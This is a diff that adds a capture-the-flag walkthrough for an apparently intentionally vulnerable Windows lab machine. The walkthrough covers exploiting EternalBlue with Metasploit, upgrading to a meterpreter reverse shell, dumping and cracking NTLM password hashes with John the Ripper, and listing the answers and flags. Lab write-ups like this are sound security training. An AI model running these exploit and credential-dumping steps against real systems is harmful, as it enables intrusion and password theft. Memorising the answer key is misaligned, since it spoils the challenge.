@@ -156,11 +156,171 @@ msf6 > search ms17-010
 
 > exploit/windows/smb/ms17\_010\_eternalblue
 
-#### 2.2 - Show options and set the one required value. What is the name of this value? (All caps for submission)
+2.2 - Show options and set the one required value. What is the name of this value? (All caps for submission)
 
 > RHOSTS
 
-#### 2.3 - Exploit the machine and gain a foothold.
+2.3 - Exploit the machine and gain a foothold.
+
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST blue.thm
+RHOST => blue.thm
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.9.80.228
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+```
+
+<figure><img src=".gitbook/assets/Schermata del 2023-06-05 21-49-23.png" alt=""><figcaption></figcaption></figure>
+
+### Task 3 - Escalate 
+
+#### 3.1 - Convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)
+
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter
+```
+
+```bash
+Matching Modules
+================
+
+   #  Name                                    Disclosure Date  Rank    Check  Description
+   -  ----                                    ---------------  ----    -----  -----------
+   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade
+   
+```
+
+#### 3.2 - Select this (use MODULE\_PATH). Show options, what option are we required to change?
+
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > use 0
+msf6 post(multi/manage/shell_to_meterpreter) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                   Connection
+  --  ----  ----                     -----------                   ----------
+  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.9.80.228:4444 -> 10.10.37.188:49211 (10.10.37.188)
+
+msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 2
+SESSION => 2
+msf6 post(multi/manage/shell_to_meterpreter) > run
+
+```
+
+```bash
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.9.80.228:4433 
+[*] Post module execution completed
+```
+
+```bash
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+```bash
+meterpreter > ps
+```
+
+<figure><img src=".gitbook/assets/Schermata del 2023-06-05 22-25-45.png" alt=""><figcaption></figcaption></figure>
+
+#### 3.3 - Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.
+
+```bash
+meterpreter > migrate 1068
+[*] Migrating from 1364 to 1068...
+[*] Migration completed successfully.
+meterpreter > migrate 1704
+[*] Migrating from 1068 to 1704...
+meterpreter > migrate 1688
+[*] Migrating from 1068 to 1688...
+[*] Migration completed successfully.
+```
+
+### Task 4 - Cracking
+
+#### 4.1 - Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?&#x20;
+
+<figure><img src=".gitbook/assets/Schermata del 2023-06-05 22-33-23.png" alt=""><figcaption></figcaption></figure>
+
+> Jon
+
+#### 4.2 - Copy this password hash to a file and research how to crack it. What is the cracked password?
+
+```bash
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+```
+
+```bash
+echo 'ffb43f0de35be4d9917ac0cc8ad57f8d' > jon_hash.txt
+```
+
+We copy this hash and crack it using John The Ripper while using rockyou.txt wordlist.
+
+```bash
+john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt jon_hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=2
+Press 'q' or Ctrl-C to abort, almost any other key for status
+alqfna22         (?)     
+1g 0:00:00:00 DONE (2023-06-05 22:39) 1.369g/s 13973Kp/s 13973Kc/s 13973KC/s alr19882006..alpusidi
+```
+
+Jon's credentials are `jon`:`alqfna22`
+
+> alqfna22
+
+### Task 5 - Find flags!
+
+#### 5.1 - Flag1? _This flag can be found at the system root._&#x20;
+
+As we have a meterpreter shell we could search for a file on the system.
+
+We start by changing our directory to C:/ (root of system). We find the flag1.txt in the system root.
+
+<details>
+
+<summary>Flag 1</summary>
+
+flag{access\_the\_machine}
+
+</details>
+
+#### 5.2 - Flag2? _This flag can be found at the location where passwords are stored within Windows._
+
+Check directories by using the “dir” command. Then I see the flag1.txt file.
+
+<details>
+
+<summary>Flag 2</summary>
+
+flag{sam\_database\_elevated\_access}
+
+</details>
+
+#### 5.3 - Flag3? _This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved._&#x20;
+
+```bash
+meterpreter > search -f flag3.txt
+```
+
+After that you see the flag3.txt file, Then read it.
+
+<details>
+
+<summary>Flag 3</summary>
+
+flag{admin\_documents\_can\_be\_valuable}
+
+</details>
+
+\
+
+
+\
+
 
 \
 
